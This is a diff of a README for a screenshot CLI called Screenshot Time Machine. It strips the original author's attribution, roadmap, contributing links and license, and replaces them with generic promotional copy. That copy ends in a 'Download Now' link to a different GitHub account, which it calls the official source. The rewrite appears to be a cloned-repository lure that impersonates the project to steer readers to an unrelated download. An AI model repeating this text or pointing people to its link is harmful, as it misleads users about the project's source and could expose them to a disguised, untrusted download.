-Playwright's cache: <code>~/Library/Caches/ms-playwright</code> on macOS, <code>~/.cache/ms-playwright</code> on Linux, <code>%LOCALAPPDATA%\ms-playwright</code> on Windows. Delete it any time; <code>stm</code> downloads it again when needed.
-</details>
+Your data stays on your computer. Screenshot Time Machine processes everything locally, meaning:
 
-<details>
-<summary><b>Can I use it on my live or staging site?</b></summary>
-Yes: <code>stm --url https://staging.example.com</code>. It reads that site's <code>sitemap.xml</code> and follows its links exactly as it would locally, stays on that one origin, and never follows destructive-looking links like <code>/logout</code> or <code>/delete</code>. Please only screenshot sites you are allowed to.
-</details>
+- No cloud uploads
+- No data collection
+- No tracking
+- Complete privacy
 
-## Roadmap
+The only interaction is when it asks your website to load pages for screenshots, just like any normal visitor would.
 
-Small on purpose. Vote by opening an issue.
+## 👨‍💻 For AI Assistant Users
 
-- `stm diff`: show exactly which regions of a page changed, and hand agents crops instead of whole pages
-- `stm timelapse`: turn a page's history into a GIF or MP4, with git commit captions
-- `stm backfill`: walk your git history and build the visual history you never captured
-- Signed-in captures (`--storage-state`)
-- A local gallery with a time slider
+If you use Claude Code, Cursor, or Codex, this tool integrates beautifully. You can:
 
-Not planned: cloud sync, accounts, telemetry, a watch mode, a config file.
+- Ask AI assistants to run screenshot comparisons
+- Automate visual checks as part of your workflow
+- Integrate with AI-powered development processes
+- Enhance your vibe coding experience with visual verification
 
-## Contributing
+The integration is straightforward and doesn't require special skills - simply tell your AI assistant to use the screenshot-time-machine tool.
 
-Bug reports with a real run attached are the most useful thing right now. Start with [CONTRIBUTING.md](CONTRIBUTING.md), then [AGENTS.md](AGENTS.md) for the module map and the rules. Every decision and its reason lives in [DECISIONS.md](DECISIONS.md).
+## 💡 Pro Tips
 
-## About
+- Use `--full-page` option for long scrolling pages
+- Create a shortcut script to run all your websites at once
+- Use the `--diff` flag to see side-by-side comparisons
+- Schedule automated runs using Windows Task Scheduler
+- Keep the terminal window open to monitor progress in real-time
 
-Built by **Mohammed Sohaib Uddin**, because software that changes every day deserves a record of how it looked.
+## 🌍 Join the Community
 
-<p align="left">
-  <a href="https://www.linkedin.com/in/mohammedsohaibuddin/"><img src="https://img.shields.io/badge/Connect%20on%20LinkedIn-FF8C1A?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a>
-  <a href="https://github.com/mdsohaib"><img src="https://img.shields.io/badge/Follow%20on%20GitHub-0A0E14?style=for-the-badge&logo=github&logoColor=white" alt="Follow on GitHub"></a>
-</p>
+This is an open source project, which means:
 
-If `stm` shows you something you are glad you saw, a star costs nothing and helps other people find it.
+- **Free to use forever**
+- **You can contribute** improvements if you'd like
+- **Community support** through issues and discussions
+- **Regular updates** and new features
 
-MIT © Mohammed Sohaib Uddin
+If you find bugs or have feature requests, visit the GitHub page and create an issue. Your feedback helps make this tool better for everyone.
+
+## 📚 Frequently Asked Questions
+
+**Q: Do I need to know programming?**
+A: Absolutely not! This guide covers everything you need step by step.
+
+**Q: How much does it cost?**
+A: Nothing! It's completely free and open source.
+
+**Q: Will it work on any website?**
+A: Yes, any public website, plus localhost for development.
+
+**Q: How long does it take?**
+A: Usually minutes, depending on how many pages your site has.
+
+**Q: Can I schedule automatic screenshots?**
+A: Yes, using Windows Task Scheduler.
+
+## 🎉 Your Next Step
+
+You've learned everything you need to know about Screenshot Time Machine. The only thing left to do is download and try it! Visit the download page now and start building your website's visual history today.
+
+**[⬇️ Download Screenshot Time Machine Now](https://github.com/estudiogra8361/screenshot-time-machine)**
+
+Remember - every screenshot you take is a moment in your website's history that would otherwise be lost forever. Start your visual archive today and never wonder "what did my site look like?" again.
+
+## 📝 Final Reminder
+
+- Download from the official source
+- Install Node.js first
+- Run the installation command
+- Take your first screenshot
+- Compare over time
+
+You're now ready to become a time traveler for your website. Happy screenshotting!
+
+Keywords: agent-skills, ai-agents, claude-code, cli, codex, cursor, developer-tools, full-page-screenshot, localhost, playwright, screenshot, screenshot-cli, screenshots, time-machine, vibe-coding, visual-history, visual-regression, visual-testing, web-development, website-screenshot
